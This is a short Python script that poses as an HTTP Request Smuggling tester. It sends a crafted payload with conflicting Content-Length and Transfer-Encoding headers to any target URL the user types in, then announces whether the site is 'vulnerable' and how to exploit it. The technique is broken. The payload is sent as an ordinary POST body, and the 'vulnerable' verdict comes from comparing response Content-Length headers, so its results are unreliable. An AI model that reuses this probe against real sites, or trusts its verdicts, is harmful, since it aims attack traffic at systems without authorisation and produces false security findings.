import requests
from bs4 import BeautifulSoup
from termcolor import colored

def test_smuggling(url):
    print(colored("[*] Testing HTTP Request Smuggling vulnerability on:", "blue"), colored(url, "green"))

    # Sending a request to the target website
    response = requests.get(url)
    if response.status_code != 200:
        print(colored("[!] Error: Failed to fetch the target website.", "red"))
        return

    print(colored("[*] Initial response headers:", "blue"))
    print(response.headers)

    # Sending a crafted request to test for smuggling vulnerability
    smuggling_request = "GET / HTTP/1.1\r\nHost: {}\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\nF\r\n0\r\n\r\n".format(url.split("//")[1].split("/")[0])
    print(colored("[*] Sending crafted request:", "blue"))
    print(smuggling_request)

    crafted_response = requests.request("POST", url, headers={"Content-Length": "31"}, data=smuggling_request)
    if crafted_response.status_code != 200:
        print(colored("[!] Error: Failed to send crafted request.", "red"))
        return

    print(colored("[*] Crafted response headers:", "blue"))
    print(crafted_response.headers)

    # Analyzing the response to determine if the target is vulnerable
    if response.headers.get("Content-Length") == crafted_response.headers.get("Content-Length"):
        print(colored("[+] Target website is vulnerable to HTTP Request Smuggling!", "green"))
        print(colored("[*] To exploit the vulnerability, you can send a request with a smuggling payload.", "green"))
    else:
        print(colored("[-] Target website is not vulnerable to HTTP Request Smuggling.", "yellow"))

if __name__ == "__main__":
    target_url = input(colored("Enter your target website URL: ", "cyan"))
    test_smuggling(target_url)
